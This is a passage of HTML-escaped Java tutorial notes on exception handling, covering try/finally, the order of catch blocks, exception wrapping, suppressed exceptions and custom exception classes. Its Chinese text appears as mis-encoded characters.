&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>å¦‚æžœä¸æƒ³ç”¨tryå¯ä»¥ç›´æŽ¥æŠŠ&lt;code>main()&lt;/code>æ–¹æ³•å®šä¹‰ä¸º&lt;code>throws Exception&lt;/code>&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.UnsupportedEncodingException&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.Arrays&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">bs&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">toGBK&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;ä¸­æ–‡&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Arrays&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">toString&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">bs&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#75af00">toGBK&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">UnsupportedEncodingException&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// ç”¨æŒ‡å®šç¼–ç è½¬æ¢Stringä¸ºbyte[]:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getBytes&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;GBK&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>ç›¸å½“äºŽå£°æ˜Žäº†æ‰€æœ‰å¯èƒ½æŠ›å‡ºçš„Exceptionï¼Œä¹Ÿå°±ä¸ç”¨æ•èŽ·äº†ï¼›ä»£ä»·å°±æ˜¯ä¸€æ—¦å‘ç”Ÿå¼‚å¸¸ï¼Œç¨‹åºä¼šç«‹åˆ»é€€å‡ºï¼Œä¸å¤Ÿçµæ´»&lt;/p>
&lt;ul>
&lt;li>å½“æ–¹æ³•å£°æ˜Žäº†å¯èƒ½æŠ›å‡ºçš„å¼‚å¸¸ï¼Œå¯ä»¥æ²¡æœ‰&lt;code>catch&lt;/code>ï¼Œåªä½¿ç”¨&lt;code>try ... finally&lt;/code>ç»“æž„&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">process&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">file&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">IOException&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">...&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">finally&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;END&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>å¯ä»¥ä¸€ä¸ªtryå¯¹å¤šä¸ªcatchï¼Œæ­¤æ—¶æ³¨æ„catchçš„é¡ºåºï¼šå­ç±»åœ¨å‰ï¼Œé¿å…çŸ­è·¯&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">process1&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">process2&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">process3&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">IOException&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;IO error&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">UnsupportedEncodingException&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span> &lt;span style="color:#75715e">// æ°¸è¿œæ•èŽ·ä¸åˆ° ä¼šè¢«ä¸Šé¢çš„æˆªèƒ¡
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Bad encoding&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="æŠ›å‡ºå¼‚å¸¸">æŠ›å‡ºå¼‚å¸¸&lt;/h3>
&lt;ul>
&lt;li>åˆ†ä¸¤æ­¥ï¼šåˆ›å»ºæŸä¸ª&lt;code>Exception&lt;/code>çš„å®žä¾‹ -&amp;gt; æŠ›å‡º&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">process2&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">==&lt;/span>&lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">NullPointerException&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>å¦‚æžœä¸€ä¸ªæ–¹æ³•æ•èŽ·äº†æŸä¸ªå¼‚å¸¸åŽï¼Œåˆåœ¨&lt;code>catch&lt;/code>å­å¥ä¸­æŠ›å‡ºæ–°çš„å¼‚å¸¸ï¼Œå°±ç›¸å½“äºŽæŠŠæŠ›å‡ºçš„å¼‚å¸¸ç±»åž‹â€œè½¬æ¢â€äº†ï¼›æ³¨æ„ä¸ºäº†èƒ½è¿½è¸ªåˆ°å®Œæ•´çš„å¼‚å¸¸æ ˆï¼Œåœ¨æž„é€ å¼‚å¸¸çš„æ—¶å€™ï¼ŒæŠŠåŽŸå§‹çš„&lt;code>Exception&lt;/code>å®žä¾‹ä¼ è¿›åŽ»&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">process1&lt;/span>&lt;span style="color:#f92672">();&lt;/span> &lt;span style="color:#75715e">// 01
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">printStackTrace&lt;/span>&lt;span style="color:#f92672">();&lt;/span> &lt;span style="color:#75715e">// 05
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">process1&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">process2&lt;/span>&lt;span style="color:#f92672">();&lt;/span> &lt;span style="color:#75715e">// 02
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">NullPointerException&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// throw new IllegalArgumentException();
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">IllegalArgumentException&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// 04
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">process2&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">NullPointerException&lt;/span>&lt;span style="color:#f92672">();&lt;/span> &lt;span style="color:#75715e">// 03
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>å¦‚æžœç”¨æ³¨é‡ŠæŽ‰çš„æ–¹å¼å†™å°±ä¼šä¸¢å¤±&lt;code>NullPointerException&lt;/code>è¿™ä¸€æ¡&lt;/p>
&lt;ul>
&lt;li>åœ¨ä»£ç ä¸­èŽ·å–åŽŸå§‹å¼‚å¸¸å¯ä»¥ä½¿ç”¨&lt;code>Throwable.getCause()&lt;/code>æ–¹æ³•ã€‚å¦‚æžœè¿”å›ž&lt;code>null&lt;/code>ï¼Œè¯´æ˜Žå·²ç»æ˜¯â€œæ ¹å¼‚å¸¸â€äº†(Caused by: xxxx)&lt;/li>
&lt;li>å¦‚æžœåœ¨finallyä¸­æŠ›å‡ºå¼‚å¸¸ï¼ˆå°½é‡åˆ«ï¼‰ï¼Œç”±äºŽ&lt;code>catch&lt;/code>ä¸­å‡†å¤‡æŠ›å‡ºçš„å¼‚å¸¸å°±â€œæ¶ˆå¤±â€äº†ï¼Œæ‰€ä»¥è¿™ä¸ªæ²¡æœ‰è¢«æŠ›å‡ºçš„å¼‚å¸¸ç§°ä¸ºâ€œè¢«å±è”½â€çš„å¼‚å¸¸Suppressed Exception&lt;/li>
&lt;li>å¦‚æžœæˆ‘ä»¬éœ€è¦èŽ·çŸ¥æ‰€æœ‰çš„å¼‚å¸¸ï¼Œå¯ä»¥å…ˆç”¨&lt;code>origin&lt;/code>å˜é‡ä¿å­˜åŽŸå§‹å¼‚å¸¸ï¼Œç„¶åŽè°ƒç”¨&lt;code>Throwable.addSuppressed()&lt;/code>ï¼ŒæŠŠåŽŸå§‹å¼‚å¸¸æ·»åŠ è¿›æ¥ï¼Œæœ€åŽåœ¨&lt;code>finally&lt;/code>æŠ›å‡º&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#111">origin&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Integer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">parseInt&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;abc&amp;#34;&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">origin&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">finally&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#111">e&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">IllegalArgumentException&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">origin&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">addSuppressed&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">origin&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>å½“&lt;code>catch&lt;/code>å’Œ&lt;code>finally&lt;/code>éƒ½æŠ›å‡ºäº†å¼‚å¸¸æ—¶ï¼Œè™½ç„¶&lt;code>catch&lt;/code>çš„å¼‚å¸¸è¢«å±è”½äº†ï¼Œä½†æ˜¯ï¼Œ&lt;code>finally&lt;/code>æŠ›å‡ºçš„å¼‚å¸¸ä»ç„¶åŒ…å«äº†å®ƒï¼š&lt;/p>
&lt;pre tabindex="0">&lt;code>Exception in thread &amp;#34;main&amp;#34; java.lang.IllegalArgumentException
at Main.main(Main.java:11)
Suppressed: java.lang.NumberFormatException: For input string: &amp;#34;abc&amp;#34;
at java.base/java.lang.NumberFormatException.forInputString(NumberFormatException.java:65)
at java.base/java.lang.Integer.parseInt(Integer.java:652)
at java.base/java.lang.Integer.parseInt(Integer.java:770)
at Main.main(Main.java:6)
&lt;/code>&lt;/pre>&lt;p>é€šè¿‡&lt;code>Throwable.getSuppressed()&lt;/code>å¯ä»¥èŽ·å–æ‰€æœ‰çš„&lt;code>Suppressed Exception&lt;/code>&lt;/p>
&lt;h3 id="è‡ªå®šä¹‰å¼‚å¸¸">è‡ªå®šä¹‰å¼‚å¸¸&lt;/h3>
&lt;ul>
&lt;li>è§çš„åšæ³•æ˜¯è‡ªå®šä¹‰ä¸€ä¸ª&lt;code>BaseException&lt;/code>ä½œä¸ºâ€œæ ¹å¼‚å¸¸â€ï¼Œç„¶åŽï¼Œæ´¾ç”Ÿå‡ºå„ç§ä¸šåŠ¡ç±»åž‹çš„å¼‚å¸¸ï¼›&lt;code>BaseException&lt;/code>éœ€è¦ä»Žä¸€ä¸ªé€‚åˆçš„&lt;code>Exception&lt;/code>æ´¾ç”Ÿï¼Œé€šå¸¸å»ºè®®ä»Ž&lt;code>RuntimeException&lt;/code>æ´¾ç”Ÿ&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">BaseException&lt;/span> &lt;span style="color:#00a8c8">extends&lt;/span> &lt;span style="color:#111">RuntimeException&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">UserNotFoundException&lt;/span> &lt;span style="color:#00a8c8">extends&lt;/span> &lt;span style="color:#111">BaseException&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">LoginFailedException&lt;/span> &lt;span style="color:#00a8c8">extends&lt;/span> &lt;span style="color:#111">BaseException&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>è‡ªå®šä¹‰çš„&lt;code>BaseException&lt;/code>åº”è¯¥æä¾›å¤šä¸ªæž„é€ æ–¹æ³•&lt;/li>
&lt;/ul>
